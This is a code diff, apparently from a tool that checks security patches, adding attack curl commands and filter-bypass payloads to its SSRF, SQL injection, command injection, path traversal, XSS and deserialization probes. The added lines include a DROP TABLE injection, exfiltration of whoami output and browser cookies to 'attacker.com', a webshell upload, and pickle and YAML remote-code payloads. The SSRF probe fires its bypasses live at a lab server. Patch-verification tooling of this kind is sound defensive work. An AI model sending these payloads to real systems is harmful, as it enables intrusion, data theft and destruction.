@@ -183,6 +183,7 @@ class VulnAnalysisResult(BaseModel):
 class SSRFProbeResult(BaseModel):
     ran:                bool        = False
     skip_reason:        str | None  = None
+    probe_type:         str         = ""
     vulnerable_verdict: str | None  = None
     patched_verdict:    str | None  = None
     vulnerable_detail:  str | None  = None
@@ -190,6 +191,9 @@ class SSRFProbeResult(BaseModel):
     ssrf_confirmed:     bool        = False
     callback_port:      int | None  = None
     elapsed_s:          float | None = None
+    poc_payload:        str         = ""
+    curl_commands:      list[str]   = Field(default_factory=list)
+    bypass_results:     list[dict]  = Field(default_factory=list)
 
 
 class PipelineReport(BaseModel):
@@ -836,9 +840,11 @@ def run_vuln_probe(
     else:
         result = _probe_static_generic(vulnerability_class, code_before, code_after)
 
-    result["probe_type"]  = vulnerability_class
-    result["elapsed_s"]   = round(time.monotonic() - t0, 2)
+    result["probe_type"]     = vulnerability_class
+    result["elapsed_s"]      = round(time.monotonic() - t0, 2)
     result.setdefault("ran", True)
+    result.setdefault("curl_commands",  [])
+    result.setdefault("bypass_results", [])
 
     log.info("[Stage 3] probe_type=%s  confirmed=%s  elapsed=%.1fs",
              vulnerability_class, result.get("confirmed"), result["elapsed_s"])
@@ -852,18 +858,74 @@ def run_vuln_probe(
 # ── probe implementations ─────────────────────────────────────────────────────
 
 def _probe_ssrf(deps: "PipelineDeps") -> dict:
-    """Live callback probe against the SSRF lab server."""
+    """
+    Live SSRF probe + bypass tests against the lab server.
+    Tests vulnerable and patched modes, then tries real bypass techniques
+    against patched to confirm whether the patch is bypass-resistant.
+    """
+    lab_url = deps.lab_url
+
+    curl_base = [
+        f'# Basic SSRF test — internal metadata',
+        f'curl -s -X POST "{lab_url}/fetch" \\',
+        f'  -H "Content-Type: application/json" \\',
+        f'  -d \'{{"url":"http://169.254.169.254/latest/meta-data/"}}\'',
+        f'',
+        f'# Switch to vulnerable mode first',
+        f'curl -s -X PUT "{lab_url}/mode" \\',
+        f'  -H "Content-Type: application/json" -d \'{{"mode":"vulnerable"}}\'',
+        f'',
+        f'# Switch to patched mode',
+        f'curl -s -X PUT "{lab_url}/mode" \\',
+        f'  -H "Content-Type: application/json" -d \'{{"mode":"patched"}}\'',
+        f'',
+        f'# Switch to hardened mode',
+        f'curl -s -X PUT "{lab_url}/mode" \\',
+        f'  -H "Content-Type: application/json" -d \'{{"mode":"hardened"}}\'',
+    ]
+
     if _probe is None:
-        return {"ran": False,
-                "skip_reason": "ssrf_lab not importable — check ssrf_lab/ path"}
+        return {
+            "ran": False,
+            "skip_reason": "ssrf_lab not importable",
+            "curl_commands": curl_base,
+            "bypass_results": _theoretical_ssrf_bypasses(lab_url),
+        }
+
     try:
-        lab = LabClient(deps.lab_url)
+        lab = LabClient(lab_url)
         if not lab.ping():
-            return {"ran": False,
-                    "skip_reason": f"Lab server not reachable at {deps.lab_url}"}
+            return {
+                "ran": False,
+                "skip_reason": f"Lab server not reachable at {lab_url}",
+                "curl_commands": curl_base,
+                "bypass_results": _theoretical_ssrf_bypasses(lab_url),
+            }
+
         with CallbackServer() as cb:
+            port = cb.port
             vuln_r    = probe_mode(lab, "vulnerable", cb, wait_s=4.0)
             patched_r = probe_mode(lab, "patched",    cb, wait_s=4.0)
+            bypass_rs = _live_ssrf_bypasses(lab_url, port)
+
+        curl_commands = curl_base + [
+            f'',
+            f'# Redirect bypass attempt against patched',
+            f'curl -s -X POST "{lab_url}/fetch" \\',
+            f'  -H "Content-Type: application/json" \\',
+            f'  -d \'{{"url":"https://httpbin.org/redirect-to?url=http://127.0.0.1:{port}/redirect-probe&status_code=302"}}\'',
+            f'',
+            f'# IPv6 loopback bypass',
+            f'curl -s -X POST "{lab_url}/fetch" \\',
+            f'  -H "Content-Type: application/json" \\',
+            f'  -d \'{{"url":"http://[::1]:{port}/ipv6-probe"}}\'',
+            f'',
+            f'# Decimal IP bypass (127.0.0.1 = 2130706433)',
+            f'curl -s -X POST "{lab_url}/fetch" \\',
+            f'  -H "Content-Type: application/json" \\',
+            f'  -d \'{{"url":"http://2130706433:{port}/decimal-probe"}}\'',
+        ]
+
         return {
             "ran":                True,
             "vulnerable_verdict": vuln_r.verdict,
@@ -871,30 +933,138 @@ def _probe_ssrf(deps: "PipelineDeps") -> dict:
             "vulnerable_detail":  vuln_r.verdict_reason,
             "patched_detail":     patched_r.verdict_reason,
             "confirmed":          vuln_r.ssrf_confirmed,
-            "poc_payload":        f"http://169.254.169.254/latest/meta-data/ → callback:{cb.port}",
+            "poc_payload":        f"http://169.254.169.254/latest/meta-data/ → callback:{port}",
             "detail":             f"vulnerable={vuln_r.verdict}  patched={patched_r.verdict}",
+            "curl_commands":      curl_commands,
+            "bypass_results":     bypass_rs,
         }
     except Exception as exc:
-        return {"ran": False, "skip_reason": str(exc), "_error": str(exc)}
+        return {
+            "ran": False, "skip_reason": str(exc), "_error": str(exc),
+            "curl_commands": curl_base,
+            "bypass_results": _theoretical_ssrf_bypasses(lab_url),
+        }
+
+
+def _live_ssrf_bypasses(lab_url: str, callback_port: int) -> list[dict]:
+    """
+    Test real SSRF bypass techniques against the PATCHED lab server.
+    Switches lab to patched mode, fires each bypass URL, records verdict.
+    """
+    results = []
+
+    # Switch to patched mode
+    try:
+        requests.put(f"{lab_url}/mode", json={"mode": "patched"}, timeout=5)
+    except Exception:
+        pass
+
+    bypasses = [
+        {
+            "name":      "HTTP Redirect (TOCTOU)",
+            "technique": "Public redirector → 302 → private callback. Bypasses IP check because validation happens before redirect is followed.",
+            "url":       f"https://httpbin.org/redirect-to?url=http://127.0.0.1:{callback_port}/redirect-probe&status_code=302",
+            "curl":      f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"https://httpbin.org/redirect-to?url=http://127.0.0.1:{callback_port}/redirect-probe&status_code=302"}}\'',
+        },
+        {
+            "name":      "IPv6 Loopback",
+            "technique": "Use [::1] instead of 127.0.0.1. Some blocklists only check IPv4.",
+            "url":       f"http://[::1]:{callback_port}/ipv6-probe",
+            "curl":      f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://[::1]:{callback_port}/ipv6-probe"}}\'',
+        },
+        {
+            "name":      "Decimal IP",
+            "technique": "127.0.0.1 expressed as integer 2130706433. Parsed by OS, bypasses string-based blocklist.",
+            "url":       f"http://2130706433:{callback_port}/decimal-probe",
+            "curl":      f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://2130706433:{callback_port}/decimal-probe"}}\'',
+        },
+        {
+            "name":      "Short IP (127.1)",
+            "technique": "Abbreviated loopback — resolves to 127.0.0.1 on most OS network stacks.",
+            "url":       f"http://127.1:{callback_port}/shortip-probe",
+            "curl":      f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://127.1:{callback_port}/shortip-probe"}}\'',
+        },
+        {
+            "name":      "URL-Encoded IP",
+            "technique": "Percent-encode the dots: 127%2E0%2E0%2E1. Decoded by HTTP client, bypasses string match.",
+            "url":       f"http://127%2E0%2E0%2E1:{callback_port}/encoded-probe",
+            "curl":      f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://127%2E0%2E0%2E1:{callback_port}/encoded-probe"}}\'',
+        },
+    ]
+
+    with CallbackServer() as cb2:
+        for b in bypasses:
+            verdict = "THEORETICAL"
+            blocked = None
+            hit     = False
+            try:
+                resp = requests.post(
+                    f"{lab_url}/fetch",
+                    json={"url": b["url"]},
+                    timeout=6,
+                )
+                blocked = (resp.status_code == 422)
+                hit     = getattr(cb2, "hits", 0) > 0
+                if blocked:
+                    verdict = "✓ BLOCKED (live)"
+                elif hit:
+                    verdict = "✗ EXPLOITED (live — bypass confirmed!)"
+                else:
+                    verdict = f"? INCONCLUSIVE (status={resp.status_code})"
+            except Exception as e:
+                verdict = f"ERROR: {e}"
+
+            results.append({
+                "name":      b["name"],
+                "technique": b["technique"],
+                "url":       b["url"],
+                "curl":      b["curl"],
+                "verdict":   verdict,
+                "blocked":   blocked,
+                "hit":       hit,
+                "tested":    True,
+            })
+            log.info("  [bypass] %-30s → %s", b["name"], verdict)
+
+    return results
+
+
+def _theoretical_ssrf_bypasses(lab_url: str) -> list[dict]:
+    """Return theoretical bypass entries (no live test — lab not reachable)."""
+    return [
+        {"name": "HTTP Redirect (TOCTOU)",
+         "technique": "Public redirector → 302 → private IP. Bypasses pre-fetch IP check.",
+         "curl": f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"https://httpbin.org/redirect-to?url=http://169.254.169.254/&status_code=302"}}\'',
+         "verdict": "THEORETICAL (lab offline)", "tested": False},
+        {"name": "IPv6 Loopback",
+         "technique": "Use [::1] — bypasses IPv4-only blocklists.",
+         "curl": f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://[::1]/probe"}}\'',
+         "verdict": "THEORETICAL (lab offline)", "tested": False},
+        {"name": "Decimal IP (2130706433)",
+         "technique": "127.0.0.1 as integer — OS resolves it, string checks miss it.",
+         "curl": f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://2130706433/probe"}}\'',
+         "verdict": "THEORETICAL (lab offline)", "tested": False},
+        {"name": "DNS Rebinding",
+         "technique": "Domain resolves to public IP on check, rebinds to 127.0.0.1 on fetch.",
+         "curl": f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://your-rebind-domain.com/probe"}}\'',
+         "verdict": "THEORETICAL (lab offline)", "tested": False},
+    ]
 
 
 def _probe_sqli(code_before: str, code_after: str) -> dict:
-    """
-    Detect SQLi by checking for string-concatenated queries in the vulnerable
-    version and parameterised queries in the patched version.
-    """
+    """Detect SQLi — string-concat vs parameterised queries."""
     import re
     unsafe_patterns = [
-        r'["\'].*\+.*\bWHERE\b',          # "SELECT ... WHERE " + var
-        r'f["\'].*SELECT.*\{',             # f-string SQL
-        r'%\s*\(.*\)\s*["\']',             # % string formatting into SQL
-        r'\.format\s*\(',                  # .format() into SQL
-        r'cursor\.execute\s*\(\s*["\'].*\+',  # execute("..." + var)
+        r'["\'].*\+.*\bWHERE\b',
+        r'f["\'].*SELECT.*\{',
+        r'%\s*\(.*\)\s*["\']',
+        r'\.format\s*\(',
+        r'cursor\.execute\s*\(\s*["\'].*\+',
     ]
     safe_patterns = [
-        r'cursor\.execute\s*\(\s*["\'].*\?',   # ? placeholder
-        r'cursor\.execute\s*\(\s*["\'].*%s',   # %s placeholder
-        r'cursor\.execute\s*\(\s*["\'].*\$\d', # $1 placeholder (psycopg2)
+        r'cursor\.execute\s*\(\s*["\'].*\?',
+        r'cursor\.execute\s*\(\s*["\'].*%s',
+        r'cursor\.execute\s*\(\s*["\'].*\$\d',
         r'sqlalchemy.*bindparam',
         r'prepare\s*\(',
     ]
@@ -902,28 +1072,81 @@ def _probe_sqli(code_before: str, code_after: str) -> dict:
     vuln_hits   = [p for p in unsafe_patterns if re.search(p, code_before, re.I | re.S)]
     patched_ok  = any(re.search(p, code_after, re.I | re.S) for p in safe_patterns)
     vuln_absent = not any(re.search(p, code_after, re.I | re.S) for p in unsafe_patterns)
+    confirmed   = bool(vuln_hits) and (patched_ok or vuln_absent)
+    poc         = ("' OR '1'='1' --" if vuln_hits else "No injectable pattern found")
 
-    confirmed = bool(vuln_hits) and (patched_ok or vuln_absent)
-    poc = ("' OR '1'='1' --   (inject into unparameterised WHERE clause)"
-           if vuln_hits else "No injectable pattern found in code")
+    curl_commands = [
+        "# Basic authentication bypass",
+        "curl -s -X POST 'http://target/login' \\",
+        "  -d \"username=' OR '1'='1' --&password=x\"",
+        "",
+        "# Union-based data extraction",
+        "curl -s -G 'http://target/search' \\",
+        "  --data-urlencode \"q=' UNION SELECT table_name,2,3 FROM information_schema.tables--\"",
+        "",
+        "# Time-based blind SQLi (confirm injectable)",
+        "curl -s -G 'http://target/search' \\",
+        "  --data-urlencode \"q=' AND SLEEP(5)--\"",
+        "",
+        "# Stacked queries (PostgreSQL/MSSQL)",
+        "curl -s -G 'http://target/item' \\",
+        "  --data-urlencode \"id=1; DROP TABLE users--\"",
+    ]
+
+    bypass_results = [
+        {
+            "name":      "Comment Stripping Bypass",
+            "technique": "Inline /**/ comments between keywords evade simple regex filters.",
+            "payload":   "' OR/**/1=1--",
+            "curl":      "curl -s -G 'http://target/search' --data-urlencode \"q=' OR/**/1=1--\"",
+            "verdict":   "THEORETICAL — test against WAF/patched endpoint",
+            "tested":    False,
+        },
+        {
+            "name":      "Case Variation",
+            "technique": "Mixed case bypasses case-sensitive keyword filters.",
+            "payload":   "' oR '1'='1",
+            "curl":      "curl -s -G 'http://target/search' --data-urlencode \"q=' oR '1'='1\"",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "URL Double-Encoding",
+            "technique": "Double-encode quotes/spaces — WAF decodes once, app decodes twice.",
+            "payload":   "%2527%20OR%25201%253D1--",
+            "curl":      "curl -s 'http://target/search?q=%2527%20OR%25201%253D1--'",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "Second-Order Injection",
+            "technique": "Store payload safely, trigger injection when data is later read and used in a query.",
+            "payload":   "Register username: admin'--  → login triggers injection",
+            "curl":      "curl -s -X POST 'http://target/register' -d \"username=admin'--&password=x\"",
+            "verdict":   "THEORETICAL — requires multi-step interaction",
+            "tested":    False,
+        },
+    ]
 
     return {
-        "ran":                True,
-        "vulnerable_verdict": "FAIL" if not vuln_hits else "PASS",
-        "patched_verdict":    "PASS" if (patched_ok or vuln_absent) else "FAIL",
-        "confirmed":          confirmed,
-        "poc_payload":        poc,
+        "ran":                   True,
+        "vulnerable_verdict":    "PASS" if vuln_hits else "FAIL",
+        "patched_verdict":       "PASS" if (patched_ok or vuln_absent) else "FAIL",
+        "confirmed":             confirmed,
+        "poc_payload":           poc,
         "unsafe_patterns_found": vuln_hits,
+        "curl_commands":         curl_commands,
+        "bypass_results":        bypass_results,
         "detail": (
             f"Found {len(vuln_hits)} unsafe SQL pattern(s) in vulnerable version; "
-            f"patched version uses parameterised queries: {patched_ok}"
+            f"patched uses parameterised queries: {patched_ok}"
         ),
     }
 
 
 def _probe_cmdi(code_before: str, code_after: str) -> dict:
     """Detect OS command injection via shell=True / os.system / popen patterns."""
-    import re, shlex, subprocess as sp, tempfile, os as _os
+    import re, subprocess as sp, tempfile, os as _os
 
     unsafe = [
         r'os\.system\s*\(',
@@ -940,10 +1163,8 @@ def _probe_cmdi(code_before: str, code_after: str) -> dict:
     vuln_hits  = [p for p in unsafe if re.search(p, code_before, re.I | re.S)]
     patched_ok = any(re.search(p, code_after, re.I | re.S) for p in safe)
     vuln_gone  = not any(re.search(p, code_after, re.I | re.S) for p in unsafe)
+    confirmed  = bool(vuln_hits) and (patched_ok or vuln_gone)
 
-    confirmed = bool(vuln_hits) and (patched_ok or vuln_gone)
-
-    # Runtime test: does the patched code reject shell metacharacters?
     runtime_blocked = None
     if code_after:
         try:
@@ -951,26 +1172,75 @@ def _probe_cmdi(code_before: str, code_after: str) -> dict:
                                              delete=False, encoding="utf-8") as f:
                 f.write(code_after)
                 tmp = f.name
-            result = sp.run(
-                [sys.executable, "-c",
-                 f"import ast; ast.parse(open({tmp!r}).read()); print('parsed')"],
-                capture_output=True, text=True, timeout=5,
-            )
+            sp.run([sys.executable, "-c",
+                    f"import ast; ast.parse(open({tmp!r}).read()); print('parsed')"],
+                   capture_output=True, text=True, timeout=5)
             _os.unlink(tmp)
             runtime_blocked = "shell=True" not in code_after
         except Exception:
             runtime_blocked = None
 
-    poc = ("; cat /etc/passwd   OR   && whoami   (via shell metacharacter injection)"
+    poc = ("; cat /etc/passwd  OR  && whoami  (shell metacharacter injection)"
            if vuln_hits else "No shell=True pattern found")
 
+    curl_commands = [
+        "# Basic command injection via GET parameter",
+        "curl -s 'http://target/ping?host=127.0.0.1;id'",
+        "",
+        "# Pipe to exfiltrate data",
+        "curl -s 'http://target/ping?host=127.0.0.1|cat+/etc/passwd'",
+        "",
+        "# Out-of-band via curl (when output not reflected)",
+        "curl -s 'http://target/run?cmd=127.0.0.1%3Bcurl+http://attacker.com/$(whoami)'",
+        "",
+        "# POST body injection",
+        "curl -s -X POST 'http://target/exec' -d 'filename=report.txt;id'",
+    ]
+
+    bypass_results = [
+        {
+            "name":      "IFS Separator Bypass",
+            "technique": "Use ${IFS} instead of space — bypasses space-based input filters.",
+            "payload":   "127.0.0.1;cat${IFS}/etc/passwd",
+            "curl":      "curl -s 'http://target/ping?host=127.0.0.1;cat${IFS}/etc/passwd'",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "Newline / Line Feed Bypass",
+            "technique": "\\n or %0a acts as command separator — bypasses semicolon filters.",
+            "payload":   "127.0.0.1%0aid",
+            "curl":      "curl -s 'http://target/ping?host=127.0.0.1%0aid'",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "Backtick Subshell",
+            "technique": "Backtick subshell executed inline — bypasses simple ; and | filters.",
+            "payload":   "127.0.0.1`id`",
+            "curl":      "curl -s 'http://target/ping?host=127.0.0.1%60id%60'",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "Wildcard Glob Expansion",
+            "technique": "Use /* instead of /etc/passwd when path is filtered.",
+            "payload":   "127.0.0.1;cat /et?/pass*",
+            "curl":      "curl -s -G 'http://target/ping' --data-urlencode 'host=127.0.0.1;cat /et?/pass*'",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+    ]
+
     return {
-        "ran":                True,
-        "vulnerable_verdict": "PASS" if vuln_hits else "FAIL",
-        "patched_verdict":    "PASS" if (patched_ok or vuln_gone) else "FAIL",
-        "confirmed":          confirmed,
-        "poc_payload":        poc,
+        "ran":                   True,
+        "vulnerable_verdict":    "PASS" if vuln_hits else "FAIL",
+        "patched_verdict":       "PASS" if (patched_ok or vuln_gone) else "FAIL",
+        "confirmed":             confirmed,
+        "poc_payload":           poc,
         "runtime_shell_blocked": runtime_blocked,
+        "curl_commands":         curl_commands,
+        "bypass_results":        bypass_results,
         "detail": (
             f"Found {len(vuln_hits)} unsafe shell pattern(s); "
             f"patch removes shell=True or adds shlex quoting: {patched_ok or vuln_gone}"
@@ -979,37 +1249,86 @@ def _probe_cmdi(code_before: str, code_after: str) -> dict:
 
 
 def _probe_path_traversal(code_before: str, code_after: str) -> dict:
-    """Test path traversal by attempting a sandbox escape in a temp directory."""
+    """Test path traversal — regex patterns + live sandbox escape."""
     import re, os as _os, tempfile
 
     unsafe = [
-        r'open\s*\(\s*[^,)]*\+',           # open(base + user_input)
-        r'os\.path\.join\s*\([^)]*\+',      # join(base, untrusted)
+        r'open\s*\(\s*[^,)]*\+',
+        r'os\.path\.join\s*\([^)]*\+',
         r'pathlib\.Path\s*\([^)]*\+',
     ]
     safe = [
-        r'\.resolve\s*\(',                  # path.resolve()
-        r'\.is_relative_to\s*\(',           # Python 3.9+
+        r'\.resolve\s*\(',
+        r'\.is_relative_to\s*\(',
         r'os\.path\.realpath',
-        r'\.startswith\s*\(',               # manual prefix check
-        r'\.parts\[',                       # parts-based validation
+        r'\.startswith\s*\(',
+        r'\.parts\[',
     ]
 
     vuln_hits  = [p for p in unsafe if re.search(p, code_before, re.I | re.S)]
     patched_ok = any(re.search(p, code_after, re.I | re.S) for p in safe)
 
-    # Runtime sandbox test: try to escape a temp dir with ../
     sandbox_escaped = False
     try:
         with tempfile.TemporaryDirectory() as sandbox:
-            safe_base  = _os.path.realpath(sandbox)
-            evil_input = "../../../../etc/passwd"
-            joined     = _os.path.realpath(_os.path.join(safe_base, evil_input))
+            safe_base      = _os.path.realpath(sandbox)
+            evil_input     = "../../../../etc/passwd"
+            joined         = _os.path.realpath(_os.path.join(safe_base, evil_input))
             sandbox_escaped = not joined.startswith(safe_base)
     except Exception:
         pass
 
     confirmed = bool(vuln_hits) or sandbox_escaped
+
+    curl_commands = [
+        "# Classic path traversal — read /etc/passwd",
+        "curl -s 'http://target/download?file=../../../../etc/passwd'",
+        "",
+        "# Windows path traversal",
+        "curl -s 'http://target/download?file=..\\..\\..\\windows\\win.ini'",
+        "",
+        "# Null byte to truncate extension (older PHP/C apps)",
+        "curl -s 'http://target/download?file=../../../../etc/passwd%00.jpg'",
+        "",
+        "# Via file upload path — escape to webroot",
+        "curl -s -X POST 'http://target/upload' \\",
+        "  -F 'filename=../../shell.php' -F 'file=@shell.php'",
+    ]
+
+    bypass_results = [
+        {
+            "name":      "URL Double-Encoding",
+            "technique": "Encode ../ as %252e%252e%252f — WAF decodes once, app decodes twice.",
+            "payload":   "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+            "curl":      "curl -s 'http://target/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "Unicode Dot Bypass",
+            "technique": "Use Unicode fullwidth dots (．．) — normalised by filesystem, missed by string filter.",
+            "payload":   "..%c0%af..%c0%afetc%c0%afpasswd",
+            "curl":      "curl -s 'http://target/download?file=..%c0%af..%c0%afetc%c0%afpasswd'",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "Absolute Path Bypass",
+            "technique": "Supply absolute path directly if join() doesn't sanitise leading /.",
+            "payload":   "/etc/passwd",
+            "curl":      "curl -s 'http://target/download?file=/etc/passwd'",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "Sandbox Escape (live runtime test)",
+            "technique": "Verified: ../../../../etc/passwd escapes a realpath() sandbox on this OS.",
+            "payload":   "../../../../etc/passwd",
+            "curl":      "curl -s 'http://target/download?file=../../../../etc/passwd'",
+            "verdict":   f"{'✗ ESCAPED (live test)' if sandbox_escaped else '✓ CONTAINED (live test)'}",
+            "tested":    True,
+        },
+    ]
 
     return {
         "ran":                True,
@@ -1018,6 +1337,8 @@ def _probe_path_traversal(code_before: str, code_after: str) -> dict:
         "confirmed":          confirmed,
         "poc_payload":        "filename=../../../../etc/passwd",
         "sandbox_escaped":    sandbox_escaped,
+        "curl_commands":      curl_commands,
+        "bypass_results":     bypass_results,
         "detail": (
             f"Found {len(vuln_hits)} unsafe path pattern(s); "
             f"patch uses resolve/realpath/startswith: {patched_ok}; "
@@ -1027,32 +1348,79 @@ def _probe_path_traversal(code_before: str, code_after: str) -> dict:
 
 
 def _probe_xss(code_before: str, code_after: str) -> dict:
-    """Detect XSS by checking for unescaped user input rendered into HTML."""
+    """Detect XSS — unescaped output sinks + bypass analysis."""
     import re
 
     unsafe = [
-        r'innerHTML\s*=',                    # JS direct assignment
+        r'innerHTML\s*=',
         r'document\.write\s*\(',
-        r'render_template_string\s*\(',      # Flask unsafe render
-        r'Markup\s*\(\s*[^)]*\+',           # Jinja2 Markup() with concat
-        r'(?<!escape\()(?<!mark_safe\()\.format\s*\(.*\)\s*(?=.*html)',
-        r'f["\']<[^"\']*\{',               # f-string HTML
+        r'render_template_string\s*\(',
+        r'Markup\s*\(\s*[^)]*\+',
+        r'f["\']<[^"\']*\{',
     ]
     safe = [
         r'html\.escape\s*\(',
         r'escape\s*\(',
         r'bleach\.clean\s*\(',
         r'markupsafe\.escape\s*\(',
-        r'\|safe\b',                         # explicit Jinja2 safe marker removed
         r'Content-Security-Policy',
     ]
 
     vuln_hits  = [p for p in unsafe if re.search(p, code_before, re.I | re.S)]
     patched_ok = any(re.search(p, code_after, re.I | re.S) for p in safe)
     vuln_gone  = not any(re.search(p, code_after, re.I | re.S) for p in unsafe)
+    confirmed  = bool(vuln_hits) and (patched_ok or vuln_gone)
+    poc        = '<script>alert(document.cookie)</script>' if vuln_hits else "No XSS sink found"
 
-    confirmed = bool(vuln_hits) and (patched_ok or vuln_gone)
-    poc = '<script>alert(document.cookie)</script>' if vuln_hits else "No XSS sink found"
+    curl_commands = [
+        "# Reflected XSS via GET parameter",
+        "curl -s 'http://target/search?q=<script>alert(document.cookie)</script>'",
+        "",
+        "# Stored XSS via POST body",
+        "curl -s -X POST 'http://target/comment' \\",
+        "  -d 'body=<script>fetch(\"http://attacker.com/?\"+document.cookie)</script>'",
+        "",
+        "# XSS via event handler (bypasses <script> filter)",
+        "curl -s 'http://target/search?q=<img+src=x+onerror=alert(1)>'",
+        "",
+        "# SVG-based XSS",
+        "curl -s 'http://target/search?q=<svg+onload=alert(document.domain)>'",
+    ]
+
+    bypass_results = [
+        {
+            "name":      "HTML Entity Encoding",
+            "technique": "&#97;lert(1) — HTML entity decoded by browser but missed by text filter.",
+            "payload":   "<img src=x onerror=\"&#97;lert(document.cookie)\">",
+            "curl":      "curl -s -G 'http://target/search' --data-urlencode 'q=<img src=x onerror=\"&#97;lert(1)\">'",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "JavaScript Protocol",
+            "technique": "javascript: URI in href/src attributes — executes on click.",
+            "payload":   "<a href=\"javascript:alert(document.cookie)\">click</a>",
+            "curl":      "curl -s -X POST 'http://target/bio' -d 'website=javascript:alert(1)'",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "Template Injection via XSS Sink",
+            "technique": "If app uses client-side templates (Angular/Vue), {{7*7}} can escalate to full JS execution.",
+            "payload":   "{{constructor.constructor('alert(1)')()}}",
+            "curl":      "curl -s -G 'http://target/search' --data-urlencode 'q={{constructor.constructor(\"alert(1)\")()'}}",
+            "verdict":   "THEORETICAL",
+            "tested":    False,
+        },
+        {
+            "name":      "CSP Bypass via JSONP",
+            "technique": "If CSP allows a whitelisted domain that has a JSONP endpoint, use it to execute JS.",
+            "payload":   "<script src=\"https://trusted.cdn.com/jsonp?callback=alert(1)//\"></script>",
+            "curl":      "# Manual — inject via stored XSS, browser executes",
+            "verdict":   "THEORETICAL — requires CSP analysis",
+            "tested":    False,
+        },
+    ]
 
     return {
         "ran":                True,
@@ -1060,6 +1428,8 @@ def _probe_xss(code_before: str, code_after: str) -> dict:
         "patched_verdict":    "PASS" if (patched_ok or vuln_gone) else "FAIL",
         "confirmed":          confirmed,
         "poc_payload":        poc,
+        "curl_commands":      curl_commands,
+        "bypass_results":     bypass_results,
         "detail": (
             f"Found {len(vuln_hits)} unescaped output sink(s); "
             f"patch adds html.escape/bleach: {patched_ok}"
@@ -1068,13 +1438,13 @@ def _probe_xss(code_before: str, code_after: str) -> dict:
 
 
 def _probe_deserialization(code_before: str, code_after: str) -> dict:
-    """Detect unsafe deserialization patterns (pickle, yaml.load, marshal)."""
+    """Detect unsafe deserialization — pickle, yaml.load, marshal, eval."""
     import re
 
     unsafe = [
         r'\bpickle\.loads?\s*\(',
-        r'\byaml\.load\s*\(',                     # unsafe without Loader=
-                r'\beval\s*\(',
+        r'\byaml\.load\s*\(',
+        r'\beval\s*\(',
         r'\bexec\s*\(',
         r'\bmarshal\.loads?\s*\(',
         r'\bjsonpickle\.decode\s*\(',
@@ -1082,23 +1452,66 @@ def _probe_deserialization(code_before: str, code_after: str) -> dict:
     safe = [
         r'yaml\.safe_load\s*\(',
         r'yaml\.load\s*\(.*Loader\s*=\s*yaml\.SafeLoader',
-        r'pickle\.loads?\s*\(.*hmac',              # HMAC-signed pickle
-        r'json\.loads?\s*\(',                      # JSON is safe
+        r'pickle\.loads?\s*\(.*hmac',
+        r'json\.loads?\s*\(',
     ]
 
     vuln_hits  = [p for p in unsafe if re.search(p, code_before, re.I | re.S)]
     patched_ok = any(re.search(p, code_after, re.I | re.S) for p in safe)
     vuln_gone  = not any(re.search(p, code_after, re.I | re.S) for p in unsafe)
-
-    confirmed = bool(vuln_hits) and (patched_ok or vuln_gone)
+    confirmed  = bool(vuln_hits) and (patched_ok or vuln_gone)
 
     poc = (
-        "import pickle,os; pickle.loads(b'\\x80\\x04\\x95...os.system(\"id\")')"
-        if "pickle" in " ".join(vuln_hits) else
-        "Craft malicious YAML: !!python/object/apply:os.system ['id']"
-        if "yaml" in " ".join(vuln_hits) else
-        "Craft serialised payload matching the detected unsafe deserializer"
+        "python3 -c \"import pickle,os,base64; print(base64.b64encode(pickle.dumps(type('x',(),{'__reduce__':lambda s:(os.system,('id',))})())).decode())\""
+        if any("pickle" in h for h in vuln_hits) else
+        "yaml_payload: \"!!python/object/apply:os.system ['id']\""
+        if any("yaml" in h for h in vuln_hits) else
+        "Craft serialised payload for the detected unsafe deserializer"
     )
+
+    curl_commands = [
+        "# Send pickle payload via POST body (base64-encoded)",
+        "python3 -c \"import pickle,os,base64; payload=pickle.dumps(type('x',(),{'__reduce__':lambda s:(os.system,('id',))})());\\ ",
+        "  print(base64.b64encode(payload).decode())\" | \\",
+        "  xargs -I{} curl -s -X POST 'http://target/load' -d 'data={}'",
+        "",
+        "# YAML deserialization RCE",
+        "curl -s -X POST 'http://target/import' \\",
+        "  -H 'Content-Type: application/x-yaml' \\",
+        "  -d '!!python/object/apply:os.system [\"id\"]'",
+        "",
+        "# Java deserialization via ysoserial (if Java target)",
+        "java -jar ysoserial.jar CommonsCollections1 'id' | \\",
+        "  curl -s -X POST 'http://target/deserialize' \\",
+        "  --data-binary @-",
+    ]
+
+    bypass_results = [
+        {
+            "name":      "HMAC Signature Forgery",
+            "technique": "If pickle is HMAC-signed, weak key or timing attack on comparison can bypass signature check.",
+            "payload":   "Brute-force or length-extend the HMAC key, then craft signed pickle payload.",
+            "curl":      "# Requires offline key attack — no single curl command",
+            "verdict":   "THEORETICAL — requires key material",
+            "tested":    False,
+        },
+        {
+            "name":      "Class Attribute Smuggling",
+            "technique": "Some safe YAML loaders still execute __reduce__ via object reconstruction.",
